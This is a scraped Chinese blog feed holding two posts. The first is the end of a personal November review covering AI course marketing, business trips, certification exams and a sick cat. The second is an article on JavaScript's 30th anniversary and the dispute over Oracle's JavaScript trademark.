<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8f345391727c41a99fcd75630a0d7132~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6KKB5bqt5paw:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765629999&amp;x-signature=916l4plWDA%2BGZHs0GgY9xb3LYlA%3D" alt="" loading="lazy"/></p>
<p>同时，在「圆心学堂」知识星球中，发布4篇主题，主要是对AI技术的思考和个人成长方面的内容。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5696b6a2230344afa6d50e23ceda6116~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6KKB5bqt5paw:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765629999&amp;x-signature=ZLydcYIbAx4QvCeMk8naoI2Si6E%3D" alt="" loading="lazy"/></p>
<p>如果有需要，你可以通过以下方式进入星球～</p>
<h2 data-id="heading-2">物料研发</h2>
<p>11月份我设计了多款产品的海报，包括精品课程封面、课程长图海报以及线下活动宣传物料等。起初我对设计排版几乎一无所知，但在AI工具和在线设计平台的帮助下，即使毫无设计基础的我也能制作出可用的海报，只是需要多花些时间打磨。</p>
<p>下图是我们举办的线下活动对应的海报：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e9a5d6c16d974f9694be4fd050d147a3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6KKB5bqt5paw:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765629999&amp;x-signature=FWGPdqWljXMeRdbCWQXB0N%2FCYts%3D" alt="" loading="lazy"/></p>
<p>下图是我给《全面掌握LiblibAI在线AI绘画》课程设置的长图海报，大家觉得怎么样呢？</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/160107e91c73451e9a8b5529797b57a4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6KKB5bqt5paw:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765629999&amp;x-signature=KXVJTLM7DWjuLxFMk5abS4Ebpzs%3D" alt="" loading="lazy"/></p>
<p>同时，为了支持市场还对人工智能讲座PPT、课程简章、课程大纲和物料知识库等都做了更新迭代。期望能给团队还有合作伙伴带来帮助，更好更快的了解和学习我们的产品。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7363eef542484689850f5a95ecedc16e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6KKB5bqt5paw:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765629999&amp;x-signature=QXXU1SKAUSiWHD8R0j8kUbzatEU%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-3">店铺运营</h2>
<p>11月份店铺的运营花了大力气，主要的平台是小鹅通和B站课堂。涉及到的工作就是建课、做封面以及长图等，因为每个平台的规则不同，往往同一份海报需要做两份来匹配不同的平台。</p>
<p>下图是小鹅通店铺H5展示样式：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/57500275eb134a37bbff2db5465a8f8c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6KKB5bqt5paw:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765629999&amp;x-signature=fplO3N1AbJ6mbj8gshb6MzhBkMo%3D" alt="" loading="lazy"/></p>
<p>下图是B站小店上架的产品：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/42c759c6625544f6a4f2c241224a02c1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6KKB5bqt5paw:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765629999&amp;x-signature=b57BMYpxwXij1Qwwmq%2Blxs187y4%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-4">高校讲座</h2>
<p>2025年11月12日为西安欧亚学院2025级信息工程学院做了一场《AIGC赋能未来职业发展》讲座报告。与学子们交流AI智能体行业落地应用及未来发展趋势。一站式解锁AI生产力，赋能未来职业发展。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cec823f54b724ed1b8e30294e420fc9a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6KKB5bqt5paw:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765629999&amp;x-signature=6T9v5dGQ0brTxhqNcRyBwF%2FUlsg%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-5">出差工作</h2>
<p>11月16日出差北京，17日在北京工业和信息化部教育与考试中心参加《工业和信息化人才培养工程培训课程标准》开会。之前给大家讲过，我是工信部教考中心《人工智能技术应用》和《生成式人工智能技术应用》人才培养工程标准的编写人，其实就是教考中心请几位不同行业的专家，针对我所写的这份人才培养标准进行评审，主要就是给一些建议，然后我再进行修改调整内容。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7a0d78bfd9cc46ca8a8d3b64d63bbdb8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6KKB5bqt5paw:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765629999&amp;x-signature=PnZhJ0mTQ41eRELMZsQrJeukzMc%3D" alt="" loading="lazy"/></p>
<p>我呢，很荣幸作为工信部教考中心《人工智能技术应用》和《生成式人工智能技术应用》人才培养工程标准主要参编人。学AI、考AI证书，选择我们，咱是真的专业。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2a169fe68fd14ce5a8e506f760aa2925~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6KKB5bqt5paw:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765629999&amp;x-signature=wIQOt6j%2FCMAh3yz%2B7xBTivvTsf4%3D" alt="" loading="lazy"/></p>
<p>17号晚，从北京又赶到了郑州，记得上次来郑州还是2018年是为了爱情。18号在郑州见了两位合作伙伴，主要给介绍了产品以及我们目前正在做的事情，期待在未来有合作的机会。</p>
<p>11月30日晚，从西安乘高铁出差到了兰州。突然觉得我们的业务发展的还挺快，北京、河南、湖南、山西、陕西现在又到了甘肃，照这个势头下去，这明年要覆盖全国了呀！</p>
<h2 data-id="heading-6">组织考试</h2>
<p>11月下旬组织了一场工信部教考中心的考试，这是一个苦差事。涉及要整理学员信息、通知学员考试、考试过程问题处理以及通知学员成绩等，非常繁琐且细致的活儿。</p>
<p>人工智能技术应用（高级）证书样图见下：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/baf32158ca514a42a49955d36c36904e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6KKB5bqt5paw:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765629999&amp;x-signature=oJiC7AyB0%2F1X%2BB1Lo5XF3M6j%2F%2Fs%3D" alt="" loading="lazy"/></p>
<p>生成式人工智能技术应用（高级）证书样图见下：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/974b2ef591404a758a1376a13801c74b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6KKB5bqt5paw:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765629999&amp;x-signature=Zm2Bwe0jqoZXHUzSwBiBG%2BOad3c%3D" alt="" loading="lazy"/></p>
<p>有需要考取工信部教考中心的职业技能证书的小伙伴也可以找我，我司是工信部教考中心西北地区唯一的授权单位，靠谱。</p>
<h2 data-id="heading-7">石榴看病</h2>
<p>11月9日，发现石榴状态特别差，精神萎靡，站不稳老想趴着，揪在猫砂碰不出来，一系列异常的举动，肯定是身体哪儿出了问题。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d4618a21847c49dd9cfb23ae43e85422~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6KKB5bqt5paw:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765629999&amp;x-signature=H4N2FuwrVLyiDdiK7zwQZ6wVLpI%3D" alt="" loading="lazy"/></p>
<p>8号晚回家，我就发现石榴有点儿不太对劲儿，老躲在猫砂盆里不出来，当时也没太在意，一位是花花又欺负它了，所以才躲起来保护自己。直到9号早上，看到它这个样子，我彻底破防了，赶紧带它去医院。</p>
<p>医生一眼就看出了石榴的问题——尿闭了。医生疗法也简单直接粗暴，直接将针管扎入石榴的膀胱抽尿，通过这种方法先解决尿涨排不出的问题。连抽了5管，每管50毫升左右，管管尿液都带着血丝，医生说肾已经损伤了。接着，医生又用一根导尿管从石榴的尿道插入，尿道可能发炎了或者有结石堵住了，看着我都觉得疼。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6a52b7189337430bae7f4844f90cdd53~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6KKB5bqt5paw:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765629999&amp;x-signature=rCv8FqrfkL3z7X8f8HlCLVFQPk0%3D" alt="" loading="lazy"/></p>
<p>石榴是我去年10月份捡回来的，虽说不用在挨饿受冻，但花花并不欢迎这个不速之客，会咬石榴且经常会把石榴驱赶到床底待着，事实上我也会区别对待石榴和花花，比如只允许花花上床。</p>
<p>医生说，猫咪得尿闭一般是情绪不好不开心所致。此刻我才意识到医生说的一点儿都没错，我、我爱人还有花花对石榴都不好，它像是被孤立的那个，怎么可能不生病呢？希望石榴快快好起来，我会像对花花那样对你的！</p>
<h2 data-id="heading-8">徒步爬山</h2>
<p>11月8日，爬翠华山看秦岭漫山红叶。年纪是真的大了，开始喜欢山山水水了，厌倦了城市的繁华，就想一个人静静地待着——看山看水！</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/92ca939f565643f6b63c21ceff0bd8dc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6KKB5bqt5paw:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765629999&amp;x-signature=qwFxyx3GO8WNXkSRXGMSSaN6Lls%3D" alt="" loading="lazy"/></p>
<p>2025年，就剩一个月了，惊出一身冷汗！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[JavaScript 今天30 岁了，但连自己的名字都不属于自己]]></title>    <link>https://juejin.cn/post/7580251192331386926</link>    <guid>https://juejin.cn/post/7580251192331386926</guid>    <pubDate>2025-12-06T11:06:57.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580251192331386926" data-draft-id="7580303864604606473" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="JavaScript 今天30 岁了，但连自己的名字都不属于自己"/> <meta itemprop="keywords" content="JavaScript"/> <meta itemprop="datePublished" content="2025-12-06T11:06:57.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="也无风雨也雾晴"/> <meta itemprop="url" content="https://juejin.cn/user/2175258804632332"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            JavaScript 今天30 岁了，但连自己的名字都不属于自己
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2175258804632332/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    也无风雨也雾晴
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-06T11:06:57.000Z" title="Sat Dec 06 2025 11:06:57 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/50630b0fd4c7400597e9556cd19f77a9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lmf5peg6aOO6Zuo5Lmf6Zu-5pm0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765624017&amp;x-signature=0Uq2FvTVR1HfoKD5E7xrpHuqjEA%3D" alt="image.png" loading="lazy"/></p>
<p>12 月 4 号，JavaScript 迎来 30 岁生日。</p>
<p>一门 10 天赶出来的语言，现在跑在 98.9% 的网站上，有 1650 万开发者在用它。从浏览器脚本到服务端运行时，从桌面应用到移动端，甚至嵌入式设备都有它的身影。TIOBE 2024 年度编程语言排行榜上，JavaScript 排第 6。</p>
<p>但 30 周年这天，社区没怎么庆祝。大家更关心的是另一件事：JavaScript 这个名字，到底能不能从 Oracle 手里抢回来。</p>
<hr/>
<h2 data-id="heading-0">10 天写出来的语言</h2>
<p>1995 年 5 月，Netscape 的工程师 Brendan Eich 接到一个任务：给浏览器加一门脚本语言。</p>
<p>时间表很紧——Navigator 2.0 Beta 版要发布了，必须赶上。</p>
<p>Eich 花了 10 天（据他回忆是 5 月 6 日到 15 日），搞出了第一个原型。这不是夸张，是真的 10 天。</p>
<p>他后来自己说：</p>
<blockquote>
<p>当你看我 10 天写的东西，它像一颗种子。是一种有力的妥协，但仍然是一个非常强大的内核，后来长成了一门更大的语言。</p>
</blockquote>
<p>这门语言最开始叫 Mocha，后来改叫 LiveScript，最后因为市场原因蹭了 Java 的热度，改名 JavaScript。</p>
<p>1995 年 12 月 4 日，Netscape 和 Sun 联合发布公告，宣布 JavaScript 正式诞生。28 家公司为这门新语言背书，包括 America Online、Apple、AT&amp;T、Borland、HP、Oracle、Macromedia、Intuit、Toshiba 等科技巨头。</p>
<p>有意思的是，Oracle 当时是 JavaScript 的支持者之一，新闻稿的媒体联系人里还有 Mark Benioff（后来创办了 Salesforce）。没想到 30 年后，Oracle 成了社区想要摆脱的"商标持有者"。</p>
<p>Sun 联合创始人 Bill Joy 说：</p>
<blockquote>
<p>JavaScript 是 Java 平台的完美补充，天生就是为互联网和全球化设计的。</p>
</blockquote>
<p>America Online 技术总裁 Mike Connors：</p>
<blockquote>
<p>JavaScript 带来了跨平台的快速多媒体应用开发能力。</p>
</blockquote>
<p>HP 的 Jan Silverman：</p>
<blockquote>
<p>JavaScript 代表了专门为互联网设计的下一代软件。</p>
</blockquote>
<p>Netscape 和 Sun 还计划把 JavaScript 提交给 W3C 和 IETF 作为开放标准。后来 JavaScript 确实标准化了，但官方名字叫 ECMAScript——因为商标问题。</p>
<p>1996 年 3 月发布 1.0 版本后，JavaScript 的野心远不止当初设想的"胶水语言"。</p>
<hr/>
<h2 data-id="heading-1">从玩具到基础设施</h2>
<p>当年 JavaScript 的定位是"胶水语言"，让不会编程的人也能在网页上加点交互。</p>
<p>没人想到它会变成今天这样。</p>
<p>几个关键节点：</p>
<p><strong>2009 年 - Node.js 诞生</strong></p>
<p>Ryan Dahl 把 V8 引擎搬到服务端，JavaScript 不再只是浏览器里的玩具。前后端同构成为可能。</p>
<p><strong>2015 年 - ES6 发布</strong></p>
<p><code>let</code>/<code>const</code> 替代 <code>var</code>，箭头函数，Promise，Class 语法... JavaScript 终于像个正经语言了。</p>
<p><strong>2012 年 - TypeScript 发布</strong></p>
<p>微软给 JavaScript 加了类型系统。2017 年只有 12% 的 JavaScript 开发者用 TypeScript，到 2024 年这个数字涨到了 35%。现在大型项目几乎都是 TypeScript。</p>
<p><strong>框架时代</strong></p>
<p>React、Vue、Angular 轮番登场。整个前端生态围绕 JavaScript 建立起来。现在有人的整个职业生涯都建立在某个特定的 JS 框架上。</p>
<p><strong>嵌入式领域</strong></p>
<p>JavaScript 甚至跑到了微控制器上。Espruino 项目让你可以在 24.95 美元的小板子上写 JavaScript，功耗低到 0.06mA，还能跑蓝牙。有个智能手表 Bangle.js 2，一块电池能用 4 周，上面跑的就是 JavaScript。</p>
<hr/>
<h2 data-id="heading-2">名字的问题</h2>
<p>JavaScript 这个名字，商标属于 Oracle。</p>
<p>Oracle 2009 年收购 Sun 的时候一起拿到的。但 Oracle 自己根本不做 JavaScript 相关的产品，商标就这么放着。</p>
<p>问题来了：因为商标在 Oracle 手里，社区做事很尴尬。</p>
<ul>
<li>不能叫 JavaScript Conference，只能叫 JSConf</li>
<li>官方规范叫 ECMAScript，不叫 JavaScript</li>
<li>写书、办会议、做项目，用 JavaScript 这个词都有法律风险</li>
</ul>
<p>Brendan Eich 2006 年写过："ECMAScript 一直是个没人想要的商业名称，听起来像皮肤病。"</p>
<p>讽刺的是，Oracle 甚至不是 OpenJS Foundation 的成员，跟 Node.js 的开发也没有任何关系。</p>
<p>Node.js 和 Deno 的创始人 Ryan Dahl 看不下去了。2024 年 9 月他发起了 "Free the Mark" 运动，发布了一封<a href="https://link.juejin.cn?target=https%3A%2F%2Fjavascript.tm%2Fletter" target="_blank" title="https://javascript.tm/letter" ref="nofollow noopener noreferrer">公开信</a>，28,600 多名开发者签名支持。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7550baa8e10c412ca933ed01dcde9337~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lmf5peg6aOO6Zuo5Lmf6Zu-5pm0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765624017&amp;x-signature=XTaMhbnKI6jcSqifJH4CfLubc5M%3D" alt="image.png" loading="lazy"/>
签名的人里有几个重量级的：</p>
<ul>
<li><strong>Brendan Eich</strong> - JavaScript 创造者本人</li>
<li><strong>Ryan Dahl</strong> - Node.js 创造者</li>
<li><strong>Michael Ficarra、Shu-yu Guo</strong> - JavaScript 规范编辑</li>
<li><strong>Rich Harris</strong> - Svelte 作者</li>
<li><strong>Isaac Z. Schlueter</strong> - npm 创始人</li>
<li><strong>James M Snell</strong> - Node.js TSC 成员</li>
<li><strong>Jordan Harband</strong> - JavaScript 规范荣誉编辑</li>
<li><strong>Matt Pocock</strong> - Total TypeScript 课程作者</li>
<li><strong>Wes Bos、Scott Tolinski</strong> - Syntax.fm 播客主持人</li>
</ul>
<p>11 月正式向美国专利商标局提交申请，要求撤销 Oracle 的商标。</p>
<p>理由有三：</p>
<ol>
<li><strong>通用化</strong> - JavaScript 已经变成通用名词了，就像 aspirin（阿司匹林）一样</li>
<li><strong>弃用</strong> - Oracle 三年多没用这个商标做任何商业用途</li>
<li><strong>欺诈</strong> - Oracle 2019 年续期商标时，提交的使用证据是 Node.js 的截图。Node.js 跟 Oracle 没有半毛钱关系</li>
</ol>
<p>公开信里说得很直白：</p>
<blockquote>
<p>Oracle 从来没有认真推出过叫 JavaScript 的产品。GraalVM 的产品页面甚至都没提"JavaScript"这个词，得翻文档才能找到它支持 JavaScript。</p>
</blockquote>
<p>公开信还指出，Oracle 2019 年续期商标时提交的"使用证据"是 nodejs.org 的截图和 Oracle JET 库。Node.js 根本不是 Oracle 的产品，JET 只是 Oracle Cloud 服务的一个 JavaScript 库，跟市面上成千上万的 JS 库没什么区别。</p>
<p>按美国法律，商标 3 年不用就算放弃。Oracle 既没用这个商标，又眼睁睁看着它变成通用名词，两条都占了。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fbe0220e4306435bb94c6d5f2f452804~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lmf5peg6aOO6Zuo5Lmf6Zu-5pm0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765624017&amp;x-signature=EEdn1lbSlb5nM1msBzZyRVC6p24%3D" alt="image.png" loading="lazy"/></p>
<p>2025 年 2 月，Oracle 申请驳回诉讼中的欺诈指控。6 月，商标审判和上诉委员会驳回了欺诈指控，但撤销申请继续审理。8 月，Oracle 首次正式回应，否认 JavaScript 是通用名词。</p>
<p>官司预计要打到 2026 年。</p>
<p>Deno 团队正在众筹 20 万美元的法律费用，用于发现阶段的调查取证，包括做公众调查来证明普通人不会把 JavaScript 和 Oracle 联系在一起。</p>
<hr/>
<h2 data-id="heading-3">30 年后的 JavaScript</h2>
<p>现在的 JavaScript 和 1995 年的已经是两门语言了。</p>
<p>当年的 <code>var</code> 被 <code>let</code>/<code>const</code> 取代。当年的原型继承有了 Class 语法糖。当年的回调地狱有了 Promise 和 async/await。</p>
<p>ES2025 刚发布，又加了一堆新特性。</p>
<p>工具链也完全不同了：</p>
<ul>
<li>打包器从 webpack 到 Vite，Vite 8 刚用上 Rolldown，速度又快了一大截</li>
<li>运行时从只有浏览器，到 Node.js、Deno、Bun 三足鼎立</li>
<li>TypeScript 成了事实上的标准</li>
<li>1650 万开发者，比很多国家的人口都多</li>
</ul>
<p>Brendan Eich 当年 10 天写的种子，长成了一片森林。</p>
<hr/>
<h2 data-id="heading-4">顺手推几个项目</h2>
<p>既然聊到 JavaScript 生态，推一下我做的几个开源项目：</p>
<p><strong><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ftt-a1i%2Fchat_edit" target="_blank" title="https://github.com/tt-a1i/chat_edit" ref="nofollow noopener noreferrer">chat_edit</a></strong> - 一个双模式 AI 应用，聊天 + 富文本编辑。Vue 3.5 + TypeScript + Vite 8 技术栈，可以自己配 API key 部署。</p>
<p><strong><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ftt-a1i" target="_blank" title="https://github.com/tt-a1i" ref="nofollow noopener noreferrer">code-review-skill</a></strong> - Claude Code 的代码审查技能，覆盖 React、Vue、TypeScript 等主流技术栈，按需加载不浪费 token。</p>
<p><strong><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ftt-a1i" target="_blank" title="https://github.com/tt-a1i" ref="nofollow noopener noreferrer">5-whys-skill</a></strong> - 根因分析技能，排查问题的时候用"5 个为什么"方法论。</p>
<p><strong><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ftt-a1i" target="_blank" title="https://github.com/tt-a1i" ref="nofollow noopener noreferrer">first-principles-skill</a></strong> - 第一性原理思考技能，适合架构设计和技术方案选型。帮你拆解问题本质。</p>
<p>感兴趣可以去 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ftt-a1i" target="_blank" title="https://github.com/tt-a1i" ref="nofollow noopener noreferrer">GitHub</a> 看看。</p>
<hr/>
<h2 data-id="heading-5">相关链接</h2>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Farstechnica.com%2Fgadgets%2F2025%2F12%2Fin-1995-a-netscape-employee-wrote-a-hack-in-10-days-that-now-runs-the-internet%2F" target="_blank" title="https://arstechnica.com/gadgets/2025/12/in-1995-a-netscape-employee-wrote-a-hack-in-10-days-that-now-runs-the-internet/" ref="nofollow noopener noreferrer">Ars Technica: In 1995, a Netscape employee wrote a hack in 10 days</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fweb.archive.org%2Fweb%2F20070916144913%2Fhttp%3A%2F%2Fwp.netscape.com%2Fnewsref%2Fpr%2Fnewsrelease67.html" target="_blank" title="https://web.archive.org/web/20070916144913/http://wp.netscape.com/newsref/pr/newsrelease67.html" ref="nofollow noopener noreferrer">1995 年原始新闻稿（存档）</a></li>
